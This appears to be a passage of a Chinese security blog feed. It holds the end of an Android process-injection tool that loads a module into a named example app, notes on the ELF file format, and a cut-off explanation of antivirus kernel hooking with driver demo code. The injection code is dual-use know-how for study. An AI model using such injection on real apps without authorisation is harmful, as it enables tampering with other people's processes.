class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"></div><div class="line">	DIR* dir = opendir( <span class="string">"/proc"</span> );</div><div class="line">	<span class="keyword">if</span> ( dir == <span class="literal">NULL</span> )</div><div class="line">		<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line"></div><div class="line">	<span class="keyword">while</span>( (entry = readdir(dir)) != <span class="literal">NULL</span> )</div><div class="line">	&#123;</div><div class="line">		ProcessDirID = atoi( entry-&gt;d_name );</div><div class="line">		<span class="keyword">if</span> ( ProcessDirID != <span class="number">0</span> )</div><div class="line">		&#123;</div><div class="line">			<span class="built_in">snprintf</span>(filename, MAX_PATH, <span class="string">"/proc/%d/cmdline"</span>, ProcessDirID);</div><div class="line">			fp = fopen( filename, <span class="string">"r"</span> );</div><div class="line">			<span class="keyword">if</span> ( fp )</div><div class="line">			&#123;</div><div class="line">				fgets(cmdline, <span class="keyword">sizeof</span>(cmdline), fp);</div><div class="line">				fclose(fp);</div><div class="line"></div><div class="line">				<span class="keyword">if</span> (<span class="built_in">strncmp</span>(process_name, cmdline, <span class="built_in">strlen</span>(process_name)) == <span class="number">0</span>)</div><div class="line">				&#123;</div><div class="line">					pid = ProcessDirID;</div><div class="line">					<span class="keyword">break</span>;</div><div class="line">				&#125;</div><div class="line">			&#125;</div><div class="line">		&#125;</div><div class="line">	&#125;</div><div class="line"></div><div class="line">	closedir(dir);</div><div class="line">	<span class="keyword">return</span> pid;</div><div class="line">&#125;</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span> *argv[])</span> </span>&#123;</div><div class="line">	<span class="keyword">char</span> InjectModuleName[MAX_PATH] = <span class="string">"/data/libInjectModule.so"</span>;        <span class="comment">// 要注入模块全路径</span></div><div class="line">	<span class="keyword">char</span> RemoteCallFunc[MAX_PATH] = <span class="string">"Inject_entry"</span>;              	      <span class="comment">// 注入模块后调用模块函数名称</span></div><div class="line">	<span class="keyword">char</span> InjectProcessName[MAX_PATH] = <span class="string">"com.example.yllen.myapplication"</span>;  <span class="comment">// 注入进程名称</span></div><div class="line">	</div><div class="line">	<span class="comment">// 当前设备环境判断</span></div><div class="line">	<span class="meta">#<span class="meta-keyword">if</span> defined(__i386__)  </span></div><div class="line">	LOGD(<span class="string">"Current Environment x86"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	<span class="meta">#<span class="meta-keyword">elif</span> defined(__arm__)</span></div><div class="line">	LOGD(<span class="string">"Current Environment ARM"</span>);</div><div class="line">	<span class="meta">#<span class="meta-keyword">else</span>     </span></div><div class="line">	LOGD(<span class="string">"other Environment"</span>);</div><div class="line">	<span class="keyword">return</span> <span class="number">-1</span>;</div><div class="line">	<span class="meta">#<span class="meta-keyword">endif</span></span></div><div class="line">	</div><div class="line">	<span class="keyword">pid_t</span> pid = FindPidByProcessName(InjectProcessName);</div><div class="line">	<span class="keyword">if</span> (pid == <span class="number">-1</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Get Pid Failed"</span>);</div><div class="line">		<span class="keyword">return</span>;</div><div class="line">	&#125;	</div><div class="line">	</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"begin inject process, RemoteProcess pid:%d, InjectModuleName:%s, RemoteCallFunc:%s\n"</span>, pid, InjectModuleName, RemoteCallFunc);</div><div class="line">	<span class="keyword">int</span> iRet = inject_remote_process(pid,  InjectModuleName, RemoteCallFunc,  <span class="literal">NULL</span>, <span class="number">0</span>);</div><div class="line">	<span class="comment">//int iRet = inject_remote_process_shellcode(pid,  InjectModuleName, RemoteCallFunc,  NULL, 0);</span></div><div class="line">	</div><div class="line">	<span class="keyword">if</span> (iRet == <span class="number">0</span>)</div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Inject Success\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="keyword">else</span></div><div class="line">	&#123;</div><div class="line">		<span class="built_in">printf</span>(<span class="string">"Inject Failed\n"</span>);</div><div class="line">	&#125;</div><div class="line">	<span class="built_in">printf</span>(<span class="string">"end inject,%d\n"</span>, pid);</div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;  </div><div class="line">&#125;</div></pre></td></tr></table></figure>
<p>Android.mk</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><div class="line">LOCAL_PATH := $(call my-dir)</div><div class="line"></div><div class="line">include $(CLEAR_VARS)</div><div class="line">LOCAL_MODULE := inject</div><div class="line">LOCAL_SRC_FILES := inject.c main.c</div><div class="line"></div><div class="line">LOCAL_LDLIBS += -L$(SYSROOT)/usr/lib -llog</div><div class="line"></div><div class="line">include $(BUILD_EXECUTABLE)</div></pre></td></tr></table></figure>
<p>参考Ref：</p>
<pre><code>1. http://gslab.qq.com/portal.php?mod=view&amp;aid=162
</code></pre>]]></content>
      
        
        <tags>
            
            <tag> 移动安全 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Elf文件格式学习]]></title>
      <url>/2016/09/17/Elf%E6%96%87%E4%BB%B6%E6%A0%BC%E5%BC%8F/</url>
      <content type="html"><![CDATA[<h2 id="背-che-景-dan"><a href="#背-che-景-dan" class="headerlink" title="背(che)景(dan)"></a>背(che)景(dan)</h2><p>又到了每年的中秋节了，话说从大学开始，对于节日的回忆基本都停留在了学校中，尤其是大三开始，每逢节日都会窝在宿舍中学习一些东西，大三的清明节了解了下<code>缓冲区溢出</code>，大四的清明节，在准备面试，也在学一些东西，貌似是<code>Windows内核</code>啥的。ok，时间转到了大学最后一个学期，清明节忙着写毕设，Wow，终于毕业了，今年中秋搞点啥呢…Elf文件格式。</p>
<p>为什么学(了)习(解)这个呢？主要是渐渐觉得要去搞移动端安全相关了，所以该有些准备知识了，话说我java也不是菜鸡(虽然N久都没看，没用了)，但那又怎样，所以路线大致是Elf-&gt;Arm汇编-&gt;Dex(smail)-&gt;Apk-&gt;java(native)-&gt;android(hook、anti&amp;prot)-&gt;android(PWN!),这个路线有些扯淡，但目前就这么定了，后面再做<code>大</code>的调整，2333…</p>
<h2 id="正-yan-文-su"><a href="#正-yan-文-su" class="headerlink" title="正(yan)文(su)"></a>正(yan)文(su)</h2><h3 id="先说下文件对象："><a href="#先说下文件对象：" class="headerlink" title="先说下文件对象："></a>先说下文件对象：</h3><ol>
<li>可重定位的对象文件(Relocatable file)<br>类似于编译器生产的中间文件，在链接时使用。</li>
<li>可执行的对象文件(Executable file)<br>可以运行的文件，比如linux下的ls、vi编辑器等</li>
<li>可被共享的对象文件(Shared object file)<br>应用程序可以将公共函数放在一个文件中(.so)，这样在运行时动态导入，节省了很多磁盘空间</li>
</ol>
<h3 id="Elf文件格式提供了两种视图，一种是链接-文件-视图，一种是运行-内存-视图，"><a href="#Elf文件格式提供了两种视图，一种是链接-文件-视图，一种是运行-内存-视图，" class="headerlink" title="Elf文件格式提供了两种视图，一种是链接(文件)视图，一种是运行(内存)视图，"></a>Elf文件格式提供了两种视图，一种是<code>链接(文件)视图</code>，一种是<code>运行(内存)视图</code>，</h3><p><img src="./16-04-05.jpg" alt=""></p>
<p>上图左侧为链接视图，右侧为运行视图,其中主要区别在section(segment)上，以Android NDK中的helloWord jni程序编译的.so文件为例，使用readelf命令解析一下：<br>使用<code>readelf -S</code> 解析sections<br><img src="./16-07-33.jpg" alt=""><br>可以看到文件有19个section(段或者节)，其中.shstrtab是文件的字符串段，后面出现的关于字符串的字段的值都是在这个字段中的下标值。<br>使用<code>readelf --segments</code>解析运行视图</p>
<p><img src="./16-11-09.jpg" alt=""><br>现在段变成了6个，可以观察到这些段都是前面section中的项，也就是说elf文件在运行时有些相同属性的段被放在同一个段中。</p>
<h4 id="为什么要这么做呢？"><a href="#为什么要这么做呢？" class="headerlink" title="为什么要这么做呢？"></a>为什么要这么做呢？</h4><p>原因是目前的os大多都是以页为单位管理内存的，在linux中，典型的页大小的为4096b=4kb，所以即使一个大小不够4kb的数据，都必须分配一个4kb大小的内存，这样对于超多section的视图来说就是在浪费空间，所以linux将相同flg值以及相关属性的section放在一个segment中，方便权限管理，这样内存的浪费也就减小下来，所以从这里可以看出，segment是section的一个子集。</p>
<h3 id="Elf组织结构"><a href="#Elf组织结构" class="headerlink" title="Elf组织结构"></a>Elf组织结构</h3><p>Elf 文件的大体结构</p>
<blockquote>
<ol>
<li>Elf header 描述整个文件的组织</li>
<li>Elf program_header_table 描述文件的各种segment，用来告诉系/统如何创建进程映像(一个段 包含 1个或多个section)</li>
<li>Elf section_header_table 包含文件的各个section的信息</li>
</ol>
</blockquote>
<p>类型<br><img src="./16-23-04.jpg" alt=""><br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span>	DWORD	Elf32_Addr;   </div><div class="line"><span class="keyword">typedef</span>	WORD	Elf32_Half;    </div><div class="line"><span class="keyword">typedef</span>	DWORD	Elf32_Off;    </div><div class="line"><span class="keyword">typedef</span>	DWORD	Elf32_Sword;  </div><div class="line"><span class="keyword">typedef</span>	DWORD	Elf32_Word;</div></pre></td></tr></table></figure></p>
<p>Elf header</p>
<p><img src="./16-26-53.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	<span class="keyword">unsigned</span> <span class="keyword">char</span>	e_ident[EI_NIDENT];</div><div class="line">	Elf32_Half		e_type;</div><div class="line">					<span class="comment">//	该成员确定该object的类型。</span></div><div class="line">					<span class="comment">//	Name        Value  Meaning</span></div><div class="line">					<span class="comment">//	====        =====  =======</span></div><div class="line">					<span class="comment">//	ET_NONE         0  No file type</span></div><div class="line">					<span class="comment">//	ET_REL          1  Relocatable file</span></div><div class="line">					<span class="comment">//	ET_EXEC         2  Executable file</span></div><div class="line">					<span class="comment">//	ET_DYN          3  Shared object file</span></div><div class="line">					<span class="comment">//	ET_CORE         4  Core file</span></div><div class="line">					<span class="comment">//	ET_LOPROC  0xff00  Processor-specific</span></div><div class="line">					<span class="comment">//	ET_HIPROC  0xffff  Processor-specific</span></div><div class="line">	</div><div class="line">	Elf32_Half		e_machine;</div><div class="line">					<span class="comment">//	该成员变量指出了运行该程序需要的体系结构。</span></div><div class="line">					<span class="comment">//	Name      Value  Meaning</span></div><div class="line">					<span class="comment">//	====      =====  =======</span></div><div class="line">					<span class="comment">//	EM_NONE       0  No machine</span></div><div class="line">					<span class="comment">//	EM_M32        1  AT&amp;T WE 32100</span></div><div class="line">					<span class="comment">//	EM_SPARC      2  SPARC</span></div><div class="line">					<span class="comment">//	EM_386        3  Intel 80386</span></div><div class="line">					<span class="comment">//	EM_68K        4  Motorola 68000</span></div><div class="line">					<span class="comment">//	EM_88K        5  Motorola 88000</span></div><div class="line">					<span class="comment">//	EM_860        7  Intel 80860</span></div><div class="line">					<span class="comment">//	EM_MIPS       8  MIPS RS3000</span></div><div class="line"></div><div class="line">	Elf32_Word		e_version;</div><div class="line">					<span class="comment">//	这个成员确定object文件的版本。</span></div><div class="line">					<span class="comment">//</span></div><div class="line">					<span class="comment">//	Name         Value  Meaning</span></div><div class="line">					<span class="comment">//	====         =====  =======</span></div><div class="line">					<span class="comment">//	EV_NONE          0  Invalid version</span></div><div class="line">					<span class="comment">//	EV_CURRENT       1  Current version</span></div><div class="line">	Elf32_Addr		e_entry;</div><div class="line">					<span class="comment">//	OEP;</span></div><div class="line">					<span class="comment">//	假如文件没有如何关联的入口点，该成员就保持为 0。</span></div><div class="line">	Elf32_Off		e_phoff;</div><div class="line">					<span class="comment">//	该成员保持着程序头表（program header table）在文件中的偏移量(以字节计数)。 same as NT HEADER</span></div><div class="line">					<span class="comment">//	假如该文件没有程序头表的的话，该成员就保持为 0。</span></div><div class="line">	Elf32_Off		e_shoff;</div><div class="line">					<span class="comment">//	该成员保持着程序头表（section header table）在文件中的偏移量(以字节计数)。 same as NT HEADER</span></div><div class="line">					<span class="comment">//	假如该文件没有程序头表的的话，该成员就保持为 0。</span></div><div class="line">	Elf32_Word		e_flags;</div><div class="line">					<span class="comment">//	该成员保存着相关文件的特定处理器标志。</span></div><div class="line">					<span class="comment">//	flag的名字来自于EF_&lt;machine&gt;_&lt;flag&gt;。看下机器信息“Machine Information”部分的flag的定义。</span></div><div class="line">	Elf32_Half		e_ehsize;</div><div class="line">					<span class="comment">//该成员保存着ELF头大小(以字节计数)。</span></div><div class="line">	Elf32_Half		e_phentsize;</div><div class="line">					<span class="comment">//	该成员保存着在文件的程序头表（program header table）中一个入口的大小</span></div><div class="line">					<span class="comment">//	(以字节计数)。所有的入口都是同样的大小。</span></div><div class="line">	Elf32_Half		e_e_phnum;</div><div class="line">					<span class="comment">//	该成员保存着在程序头表中入口的个数。</span></div><div class="line">					<span class="comment">//	因此，e_phentsize和e_phnum的乘机就是表的大小(以字节计数).</span></div><div class="line">					<span class="comment">//	假如没有程序头表（program header table），e_phnum变量为0。</span></div><div class="line">	Elf32_Half		e_shentsize;</div><div class="line">					<span class="comment">//	该成员保存着section头的大小(以字节计数)。</span></div><div class="line">					<span class="comment">//	一个section头是在section头表(section header table)的一个入口；</span></div><div class="line">					<span class="comment">//	所有的入口都是同样的大小。</span></div><div class="line">	Elf32_Half		e_shnum;</div><div class="line">					<span class="comment">//	该成员保存着在section header table中的入口数目。</span></div><div class="line">					<span class="comment">//	因此，e_shentsize和e_shnum的乘积就是section头表的大小(以字节计数)。</span></div><div class="line">					<span class="comment">//	假如文件没有section头表，e_shnum值为0。</span></div><div class="line">	Elf32_Half		e_shstrndx;</div><div class="line">					<span class="comment">//	该成员保存着跟section名字字符表相关入口的section头表(section header table)索引。</span></div><div class="line">					<span class="comment">//	假如文件中没有section名字字符表，该变量值为SHN_UNDEF。</span></div><div class="line">					<span class="comment">//	更详细的信息 看下面“Sections”和字符串表(“String Table”) 。</span></div><div class="line"></div><div class="line">&#125;Elf32_Ehdr;</div></pre></td></tr></table></figure>
<p><img src="./16-27-48.jpg" alt=""><br>program header</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></div><div class="line"><span class="class">&#123;</span></div><div class="line">	Elf32_Word		p_type;</div><div class="line">					<span class="comment">//	Name             Value</span></div><div class="line">					<span class="comment">//	====             =====</span></div><div class="line">					<span class="comment">//	PT_NULL              0</span></div><div class="line">					<span class="comment">//	PT_LOAD              1</span></div><div class="line">					<span class="comment">//	PT_DYNAMIC           2</span></div><div class="line">					<span class="comment">//	PT_INTERP            3</span></div><div class="line">					<span class="comment">//	PT_NOTE              4</span></div><div class="line">					<span class="comment">//	PT_SHLIB             5</span></div><div class="line">					<span class="comment">//	PT_PHDR              6</span></div><div class="line">					<span class="comment">//	PT_LOPROC   0x70000000</span></div><div class="line">					<span class="comment">//	PT_HIPROC   0x7fffffff</span></div><div class="line">	Elf32_Off		p_offset; </div><div class="line">					<span class="comment">//	该成员给出了该段的驻留位置相对于文件开始处的偏移。 offset file</span></div><div class="line">	Elf32_Off		p_vadrr;</div><div class="line">					<span class="comment">//	该成员给出了该段在内存中的首字节地址。   rva</span></div><div class="line">	Elf32_Addr		p_paddr;</div><div class="line">					</div><div class="line">	Elf32_Word		p_filesz;</div><div class="line">					<span class="comment">//	文件映像中该段的字节数；它可能是 0 。</span></div><div class="line">	Elf32_Word		p_memsz;</div><div class="line">					<span class="comment">//	内存映像中该段的字节数；它可能是 0 。</span></div><div class="line">	Elf32_Word		p_flags;</div><div class="line">	Elf32_Word		p_align;</div><div class="line">					<span class="comment">//	该成员给出了该段在内存和文件中排列值。</span></div><div class="line">					<span class="comment">//	0 和 1 表示不需要排列。否则， p_align 必须为正的 2 的幂，</span></div><div class="line">					<span class="comment">//	并且 p_vaddr 应当等于 p_offset 模 p_align 。</span></div><div class="line">&#125;Elf32_Phdr;</div></pre></td></tr></table></figure>
<p>section header</p>
<p><img src="./16-28-14.jpg" alt=""></p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span></div><div class="line"></div><div class="line">	Elf32_Word		sh_name;</div><div class="line">					<span class="comment">//	该成员指定了这个section的名字。</span></div><div class="line">					<span class="comment">//	它的值是section报头字符表section的索引。[看以下的“String Table”], 以NULL空字符结束。</span></div><div class="line">	Elf32_Word		sh_type;</div><div class="line">					<span class="comment">//	Section Types, sh_type</span></div><div class="line">					<span class="comment">//	---------------------------</span></div><div class="line">					<span class="comment">//	Name                 Value    Description</span></div><div class="line">					<span class="comment">//	====                 =====    ===========</span></div><div class="line">					<span class="comment">//	SHT_NULL				 0    该值表明该section头是无效的；它没有相关的section。</span></div><div class="line">					<span class="comment">//	SHT_PROGBITS			 1    该section保存被程序定义了的一些信息，它的格式和意义取决于程序本身。</span></div><div class="line">					<span class="comment">//	SHT_SYMTAB				 2    该sections保存着一个符号表（symbol table）。</span></div><div class="line">					<span class="comment">//	SHT_STRTAB				 3    该section保存着一个字符串表。</span></div><div class="line">					<span class="comment">//	SHT_RELA				 4    该section保存着具有明确加数的重定位入口。</span></div><div class="line">					<span class="comment">//	SHT_HASH				 5    该标号保存着一个标号的哈希(hash)表。</span></div><div class="line">					<span class="comment">//	SHT_DYNAMIC				 6    该section保存着动态连接的信息。</span></div><div class="line">					<span class="comment">//	SHT_NOTE				 7    该section保存着其他的一些标志文件的信息。</span></div><div class="line">					<span class="comment">//	SHT_NOBITS				 8    该类型的section在文件中不占空间，但是类似SHT_PROGBITS。</span></div><div class="line">					<span class="comment">//	SHT_REL					 9    该section保存着重定位的入口。</span></div><div class="line">					<span class="comment">//	SHT_SHLIB				10    该section类型保留但语意没有指明。包含这个类型的section的程序是不符合ABI的。</span></div><div class="line">					<span class="comment">//	SHT_DYNSYM				11    该sections保存着一个符号表（symbol table）。</span></div><div class="line">					<span class="comment">//	SHT_LOPROC		0x70000000    在这范围之间的值为特定处理器语意保留的。</span></div><div class="line">					<span class="comment">//	SHT_HIPROC		0x7fffffff    在这范围之间的值为特定处理器语意保留的。</span></div><div class="line">					<span class="comment">//	SHT_LOUSER		0x80000000    该变量为应用程序保留的索引范围的最小边界。</span></div><div class="line">					<span class="comment">//	SHT_HIUSER		0xffffffff    该变量为应用程序保留的索引范围的最大边界。</span></div><div class="line">	Elf32_Word		sh_flags;</div><div class="line">					<span class="comment">//	Section Attribute Flags, sh_flags</span></div><div class="line">					<span class="comment">//	-----------------------------------		</span></div><div class="line">					<span class="comment">//	Name                Value    Description</span></div><div class="line">					<span class="comment">//	====                =====    ===========</span></div><div class="line">					<span class="comment">//	SHF_WRITE             0x1    该section包含了在进程执行过程中可被写的数据。</span></div><div class="line">					<span class="comment">//	SHF_ALLOC             0x2    该section在进程执行过程中占据着内存。</span></div><div class="line">					<span class="comment">//	SHF_EXECINSTR         0x4    该section包含了可执行的机器指令。</span></div><div class="line">					<span class="comment">//	SHF_MASKPROC   0xf0000000    所有的包括在这掩码中的位为特定处理语意保留的。</span></div><div class="line">	Elf32_Addr		sh_addr;</div><div class="line">					<span class="comment">//	假如该section将出现在进程的内存映象空间里，该成员给出了一个该section在内存中的位置。否则，该变量为0。</span></div><div class="line">	Elf32_Off		sh_offset;</div><div class="line">					<span class="comment">//	该成员变量给出了该section的字节偏移量(从文件开始计数)。</span></div><div class="line">	Elf32_Word		sh_size;</div><div class="line">					<span class="comment">//	该成员给你了section的字节大小。</span></div><div class="line">	Elf32_Word		sh_link;</div><div class="line">					<span class="comment">//	该成员保存了一个section报头表的索引连接，它的解释依靠该section的类型。</span></div><div class="line">					<span class="comment">//	更多信息参见表"sh_link and sh_info Interpretation"</span></div><div class="line">	Elf32_Word		sh_info;</div><div class="line">					<span class="comment">//	该成员保存着额外的信息，它的解释依靠该section的类型。</span></div><div class="line"></div><div class="line">					<span class="comment">//	sh_link and sh_info Interpretation</span></div><div class="line"></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	sh_type        sh_link                          sh_info</span></div><div class="line">					<span class="comment">//	=======        =======                          =======</span></div><div class="line">					<span class="comment">//	SHT_DYNAMIC    The section header index of      0</span></div><div class="line">					<span class="comment">//	               the string table used by</span></div><div class="line">					<span class="comment">//	               entries in the section.</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	SHT_HASH       The section header index of      0</span></div><div class="line">					<span class="comment">//	               the symbol table to which the</span></div><div class="line">					<span class="comment">//	               hash table applies.</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	SHT_REL        The section header index of      The section header index of</span></div><div class="line">					<span class="comment">//	SHT_RELA       the associated symbol table.     the section to which the</span></div><div class="line">					<span class="comment">//	                                                relocation applies.</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	SHT_SYMTAB     The section header index of      One greater than the symbol</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	SHT_DYNSYM     the associated string table.     table index of the last local</span></div><div class="line">					<span class="comment">//	               symbol (binding STB_LOCAL).</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">					<span class="comment">//	other          SHN_UNDEF                        0</span></div><div class="line">					<span class="comment">//	-------------------------------------------------------------------------------</span></div><div class="line">	Elf32_Word		sh_addralign;</div><div class="line">					<span class="comment">//	一些sections有地址对齐的约束。</span></div><div class="line">	Elf32_Word		sh_entsize;</div><div class="line">					<span class="comment">//	一些sections保存着一张固定大小入口的表，就象符号表。</span></div><div class="line">					<span class="comment">//	对于这样一个section来说，该成员给出了每个入口的字节大小。</span></div><div class="line">					<span class="comment">//	如果该section没有保存着一张固定大小入口的表，该成员就为0。</span></div><div class="line"></div><div class="line">&#125;Elf32_Shdr;</div></pre></td></tr></table></figure>
<p>###关键段(符号表、重定位表、GOT表)</p>
<p>####符号表(.dynsym)<br>描述了用来定位、重定位程序中所有的符号定义以及引用的信息，符号指的是经过修饰了的函数名或者变量名，修饰方法由编译器制定。<br><code>010编辑器中Elf解析模板</code><br><img src="./16-48-08.jpg" alt=""><br>符号表的组织结构：<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> </span></div><div class="line"><span class="class">&#123;</span>  </div><div class="line">     Elf32_Word st_name;      <span class="comment">//符号表项名称。如果该值非0，则表示符号名的字</span></div><div class="line">                                     <span class="comment">//符串表索引(offset)，否则符号表项没有名称。</span></div><div class="line">     Elf32_Addr st_value;       <span class="comment">//符号的取值。依赖于具体的上下文，可能是一个绝对值、一个地址等等。</span></div><div class="line">     Elf32_Word st_size;         <span class="comment">//符号的尺寸大小。例如一个数据对象的大小是对象中包含的字节数。</span></div><div class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span> st_info;     <span class="comment">//符号的类型和绑定属性。</span></div><div class="line">     <span class="keyword">unsigned</span> <span class="keyword">char</span> st_other;    <span class="comment">//未定义。</span></div><div class="line">     Elf32_Half st_shndx;        <span class="comment">//每个符号表项都以和其他节区的关系的方式给出定义。</span></div><div class="line">　　　　　　　　　　　　　<span class="comment">//此成员给出相关的节区头部表索引。</span></div><div class="line">&#125; Elf32_sym;</div></pre></td></tr></table></figure></p>
<p>####字符串(.dynstr)<br>段描述<br><img src="./16-56-19.jpg" alt=""><br>内容</p>
<p><img src="./16-58-43.jpg" alt=""><br>其组织形式与符号表相同</p>
<p>###重定位表<br>程序经过编辑器-&gt;编译器-&gt;链接器步骤之后，并不能直接去运行，因为很多情况之下编译器是将程序从0地址开始做为基址的，当加载到内存的基地址发生变化后，原来静态计算的变量、函数地址都发生了变化，导致程序不能继续执行，或者.so文件在被加载到一个被占用的基地址时，需要重新加载到其他空闲地址，这样也要涉及到重定位，简单来说，重定位就是将程序运行所需要的函数、变量地址都关联到实际内存地址。<br>重定位表的格式<br><figure class="highlight c"><table><tr><td class="code"><pre><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></div><div class="line"><span class="class">&#123;</span>  </div><div class="line">    Elf32_Addr r_offset;     <span class="comment">//重定位动作所适用的位置（受影响的存储单位的第一个字节的偏移或者虚拟地址）</span></div><div class="line">    Elf32_Word r_info;       <span class="comment">//要进行重定位的符号表索引，以及将实施的重定位类型（哪些位需要修改，以及如何计算它们的取值）</span></div><div class="line">                              <span class="comment">//其中 .rel.dyn 重定位类型一般为R_386_GLOB_DAT和R_386_COPY；.rel.plt为R_386_JUMP_SLOT</span></div><div class="line">&#125; Elf32_Rel;</div></pre></td></tr></table></figure></p>
<p>重定位段：<br><img src="./17-06-53.jpg" alt=""></p>
<p><em>未完待续……</em></p>
<p>Ref:</p>
<ol>
<li><a href="http://blog.csdn.net/feglass/article/details/51469511" target="_blank" rel="external">http://blog.csdn.net/feglass/article/details/51469511</a></li>
</ol>
]]></content>
      
        
        <tags>
            
            <tag> DayDayUp </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[主动防御技术浅析]]></title>
      <url>/2015/10/03/%E4%B8%BB%E5%8A%A8%E9%98%B2%E5%BE%A1%E6%8A%80%E6%9C%AF%E6%B5%85%E6%9E%90/</url>
      <content type="html"><![CDATA[<p>杀毒软件为了能实时检测到系统中任何变化，并进一步进行判断该操作是否存在危害，均采用挂钩系统关键调用方式实现该流程，该技术称为主动防御技术。</p>
<p>功能方面（检测和保护）有如下方面</p>
<blockquote>
<p>比如监控文件变化、监控注册表变化、监控内存加载、监控进程\线程变化、实现自身进程保护、实现自身窗体保护、安全输入等。 </p>
</blockquote>
<p>涉及到的关键系统服务表 SSDT 、Shadow SSDT，为了更好的兼容性，一般不会直接去替换服务表中例程，而选择挂钩 KiFastCallEntry，好处有很多，至少可以自己重载一份关键系统例程，防止被在前面拦截掉。</p>
<p>实现时需要保证能在ring3下获取到ring0拦截到的信息，并且做出判断返回给ring0程序，继续执行下面的操作，也即保证ring3 、 ring0 程序同步。</p>
<p>采用方案如下：</p>
<p>&nbsp;</p>
<blockquote>
<p>1  ring3程序CreateEvent 两个事件( E1 、E2)，把句柄发送给ring0</p>
<p>2  ring0程序调用 ObReferenceObjectByHandle 获取到事件对象</p>
<p>3  ring3程序创建一个线程在里面 WaitForSingleObject ( E1 )</p>
<p>4  ring0程序拦截到一次调用，SetEvent( E1 )，此时 ring3 程序继续执行</p>
<p>ring0程序 KeWaitForSingleObject( E2 )</p>
<p>5  ring3程序进行判断该请求，将信息发给ring0 ，并SetEvent( E2 )</p>
<p>6  ring0 已经有信息了，可以继续执行。<br>&nbsp;</p>
</blockquote>
<p><img src="http://imglf0.ph.126.net/8XleipQpSANzRgQzrvhgew==/6631360235792791920.png" alt=""></p>
<p><strong>最后</strong></p>
<blockquote>
<p>本程序未挂钩KifastCallEntry 以及 HOOK 任何函数，只是一个小的demo，里面用到</p>
<p>CreateProcessNotifyFunction来实现拦截进程创建信息，后续如是要扩展，挂钩KifastCallEntry, Inline HOOK 某些API，封装事件消息，并设置一个队列来存放，依次反馈给ring3，并实现一个黑、白名单机制。<br>&nbsp;</p>
</blockquote>
<p><strong>代码：</strong></p>
<p>这里给一个简单 DEMO 关键代码：</p>
<p>驱动部分</p>
<figure class="highlight c"><table><tr><td class="code"><pre><div class="line">.h</div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"ntddk.h"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;ntstrsafe.h&gt;</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SIOCTL_TYPE FILE_DEVICE_UNKNOWN</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_START \</span></div><div class="line"></div><div class="line">CTL_CODE( SIOCTL_TYPE, <span class="number">0x901</span>, METHOD_BUFFERED, FILE_ANY_ACCESS )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_STOP \</span></div><div class="line"></div><div class="line">CTL_CODE( SIOCTL_TYPE, <span class="number">0x902</span>, METHOD_BUFFERED, FILE_ANY_ACCESS )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_GET_DATA \</span></div><div class="line"></div><div class="line">CTL_CODE( SIOCTL_TYPE, <span class="number">0x903</span>, METHOD_BUFFERED, FILE_ANY_ACCESS )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> IOCTL_SET_REPLY	\</span></div><div class="line"></div><div class="line">CTL_CODE( SIOCTL_TYPE, <span class="number">0x904</span>, METHOD_BUFFERED, FILE_ANY_ACCESS )</div><div class="line"></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> DRIVERNAMEL <span class="meta-string">"\\Device\\KernelHandle"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> SYMBOLICNAMEL <span class="meta-string">"\\DosDevices\\KernelHandle"</span></span></div><div class="line"></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> G_EVENTL <span class="meta-string">"\\BaseNamedObjects\\MyEvent"</span> <span class="comment">/* 应用层 触发 */</span></span></div><div class="line"></div><div class="line"></div><div class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">PROCESSINFO</span></span></div><div 